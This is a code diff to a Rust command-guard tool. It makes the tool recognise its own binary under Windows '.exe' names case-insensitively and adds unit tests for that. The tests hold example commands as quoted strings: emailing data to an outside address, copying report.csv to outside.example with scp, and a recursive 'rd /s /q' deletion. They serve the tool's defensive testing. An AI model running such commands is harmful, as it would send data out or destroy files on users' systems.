@@ -719,7 +719,14 @@ fn segment_is_dcg_inspection_call(segment: &str) -> bool {
 /// binary name.
 fn is_dcg_binary_name(arg0: &str) -> bool {
     let base = arg0.rsplit(['/', '\\']).next().unwrap_or(arg0);
-    base == "dcg" || base == "destructive_command_guard"
+    let stem = base
+        .get(..base.len().saturating_sub(4))
+        .filter(|_| {
+            base.get(base.len().saturating_sub(4)..)
+                .is_some_and(|suffix| suffix.eq_ignore_ascii_case(".exe"))
+        })
+        .unwrap_or(base);
+    stem.eq_ignore_ascii_case("dcg") || stem.eq_ignore_ascii_case("destructive_command_guard")
 }
 
 /// Tokenize a single shell command segment into its argv words, honoring shell
@@ -3260,6 +3267,15 @@ mod tests {
         ));
         assert!(is_dcg_self_inspection_call(
             "~/.local/bin/dcg test \"git reset --hard\""
+        ));
+        assert!(is_dcg_self_inspection_call(
+            r#"dcg.exe test "Send-MailMessage -To outside@example.test""#
+        ));
+        assert!(is_dcg_self_inspection_call(
+            r#""C:\Program Files\dcg\DCG.EXE" explain "scp report.csv user@outside.example:/drop/""#
+        ));
+        assert!(is_dcg_self_inspection_call(
+            r#"destructive_command_guard.exe classify "rd /s /q C:\data""#
         ));
     }
 
